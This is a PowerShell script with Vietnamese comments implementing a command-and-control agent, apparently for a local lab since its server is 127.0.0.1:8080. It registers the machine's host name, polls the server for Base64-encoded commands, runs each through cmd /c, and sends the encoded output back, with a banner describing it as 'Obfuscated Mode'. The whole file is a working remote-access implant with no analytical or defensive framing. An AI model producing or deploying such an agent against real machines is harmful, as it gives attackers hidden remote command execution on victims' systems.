# --- CẤU HÌNH ---
$server_url = "http://127.0.0.1:8080"
$agent_id = $null
$sleep_time = 3

# --- HÀM CHỨC NĂNG ---

function Register-Agent {
    $hostname = $env:COMPUTERNAME
    try {
        $response = Invoke-RestMethod -Uri "$server_url/reg" -Method POST -Body @{name=$hostname}
        return $response
    } catch { return $null }
}

function Get-Task {
    try {
        $task = Invoke-RestMethod -Uri "$server_url/tasks/$agent_id" -Method GET
        return $task
    } catch { return $null }
}

function Send-Result ($output_str) {
    try {
        # Mã hóa kết quả sang Base64 trước khi gửi
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($output_str)
        $encoded = [System.Convert]::ToBase64String($bytes)
        
        Invoke-RestMethod -Uri "$server_url/results/$agent_id" -Method POST -Body @{result=$encoded}
    } catch {}
}

# --- MAIN LOOP ---

Write-Host "[*] Starting Agent (Obfuscated Mode)..."
$agent_id = Register-Agent

if (-not $agent_id) { Write-Host "[-] Failed."; Exit }

Write-Host "[+] Registered ID: $agent_id"

while ($true) {
    $encoded_task = Get-Task
    
    if (-not [string]::IsNullOrEmpty($encoded_task)) {
        try {
            # Giải mã lệnh Base64 từ Server
            $bytes = [System.Convert]::FromBase64String($encoded_task)
            $cmd = [System.Text.Encoding]::UTF8.GetString($bytes)
            
            Write-Host "[*] Executing: $cmd"
            
            # Thực thi lệnh thực tế
            $result = cmd /c $cmd 2>&1 | Out-String
        } catch {
            $result = "Error: $_"
        }

        Send-Result -output_str $result
    }
    
    Start-Sleep -Seconds $sleep_time
}